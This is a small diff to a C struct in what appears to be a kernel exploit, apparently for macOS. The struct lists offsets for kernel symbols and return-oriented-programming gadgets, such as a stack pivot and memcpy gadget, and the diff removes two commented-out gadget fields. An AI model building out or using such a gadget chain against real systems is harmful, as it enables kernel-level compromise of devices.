@@ -60,11 +60,9 @@ typedef struct
     uint64_t hibernate_machine_init;
     uint64_t _hibernateStats;
     uint64_t _gFSLock;
-    //uint64_t add__rdi__ecx; XXX
     uint64_t memcpy_gadget;
     uint64_t jmp__vtab1_;
     uint64_t mov_rsi_r15_call__vtab0_;
-    //uint64_t mov_rdi__rax_8__call__rax_;
     uint64_t stack_pivot;
     uint64_t mov_rsp_rsi_call_rdi;
     uint64_t add_rsp_0x20_pop_rbp;
